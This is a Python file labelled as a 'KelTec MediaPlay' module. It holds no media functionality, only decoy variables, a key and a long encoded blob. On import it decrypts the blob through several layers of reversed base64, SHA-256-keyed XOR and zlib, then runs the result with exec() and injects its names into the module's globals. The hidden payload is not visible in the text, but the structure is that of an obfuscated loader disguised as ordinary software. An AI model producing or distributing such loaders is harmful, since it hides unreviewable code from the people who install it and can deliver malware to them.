# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 978025 ^ 414000
_lx1_1 = len("bd4299")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-903795)
_lx3_3 = 910173 * 0
_lx4_4 = 344835 ^ 868299
_K = '94345f3d0d9238db2755598d235da7813cffe4672d6b20be472b9fbc7504b3aa'
_M = 'nHvQn1KRyGnXQA=='
_D = '==Q/emaxq58uFtzrwKt2i+YFboQBzkLCOYQmZemSBiuaCCFXs88gXTsmlQg9ZQKrjrdLO7avNMH9XZI2katYxDFU+CZHmI2U/Z3+Aoc3T3mMoOqo0uU/+fHx82msneHJA8h1UH74wkedJ2tSP5EcTnWubuP8xOTTD52QLaWiT+GDCXA7X/OBqWg27e6A2DMMf9N3wc3iUijAP3qlbUcoxQ/Fop1tsL6Jr4JhdgDabdEiOm82AfHebZ9B1XYTR00hJH/PY3lI+Mv3RupX/tkEumFelX1q8r5gsAncj/MJGLtz+CfuuhyLcxUdg4+GABLsqgKh6ZwQRvGZD1bqIT2TuOstp/pbqsxUX562fz1WqNZ+dY94wi+7CRC0J8/ONg2oWjKnIgeKXIh7x/wmhsY6F2dNjtQVQLq1cDcJSfMorUHwqTXM9JyeGNGBqfHlWkuV/HpPAROz8BiErjYUgOn/Qr41BBKlAetxXouTZJBfUriOvz5LkAaNHDA1qgXJpFHWqz7y2k0lAlFu3x0JUo3pgjoW4tt0VpcZbd7QKSt/b4P7EHhjgoKXnVsRBMugudjur3rsabixmcS9FUDORGxJp3TTJ6nT1d9synvmTUnaP+1wXfLcBdKO56Xr0FiRvUa9yFzWyrImK2ak+XQwD48VYzdbRT27hrx9eHWTVNlwc8Pv5If3NBmCBVQlexa9i4waMxEtAwQU7ElfnX0shoTOG83v3sDeHX3QWdPkQ2yQVytBZ5GGI5mCOcxarnm2sGwPHz0ZXu1A2wbQbT1K50cIcaonGMO5tslbCie0A3z3I2gfCI0BrETofKVsuAi29dBlIhpmejBG5NwH063PaxP7E19wY9PLvEPyHP35pqRrMn3Y2yvzrxlwVvjvSU8p2PLbRzJpmWP2uxYngXaxGQXAbkvlZP3z/M+tBBssFlUNSXhGv6MPpsgqT7yal0w5D3oPkyxLPhF14PRqQQplB7QKy8/HClqk0d33a2Edqrf71g2MlA6e5ih4Okw64pA2gkRKrCzRZplhE7oUeWL5cU2eZiT2HOQLMRRFzAaMTjqKAEb8YpVrlzLCMzUG5rfX1CTcJa5mPYwJFDjkcq2oXyuWssX/Y18mrzFBwchkbNLcfJFlAGV/cFUdIVS1/aRzq6y/IDo0sg/pUdgWC6M5RIBWZMS74C4ZsU/gZVxxrhvLZQ2jrrJL+OjkNv9uW6hNVL1NYXMw8qUu8YpOfceASkPm8zgybZ1O1J1uv7gBMXnfZonTjgeCOr6W1Q7LkxHlQHZjINCppYrdGKin6m2stYL7BDMkbI08yPy8WjPhZV/O5+PkZjeODdSIM7897SFoQkSQn3405Vxnvqv45xyiFfcW9lzbQjHSOTJtP4LujyFzNfsbbv5olkn6hgaA0Bw1TCEgggMeuKqZ08ZWh/T/LPokTe8uAmKvL3OZbHywD08B5JiPRzbFq7eFwnIBg1cfqMhd/JmxssVYtxsWO66Qo21JYb/q7jKTjc1vFrKCjvANOPjw85OefJyhAZbi4gZiUpRfUzJEc0rWbv4do7P7PsX0H/CsFAMpWgfrV88OmWPJGeKHJ5ZfBdINg5Wcw1yyvYaseEzDG33flnk14KQDeDeZiTmASPKR77ppp3mA213orH4IBLuISfZCQ8qbnQi18poCwAJN9wHI8U/w3jf5o2UqVIII5KeIyKZURn1aZarDN8ELGTVKPF7k7uNdarq2nu0st5P1bBJ2ybi50Wk1afjcnPIK/bCNrtZwbMNOVRttu4SnZIKduCiKvCMD22Huiy7NLJ3KdE6sm5CHf5OZrK41gKPt83Tuyz6dUZ4uu7Xe3PGZ/2JxzNVsVO81v7CH'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
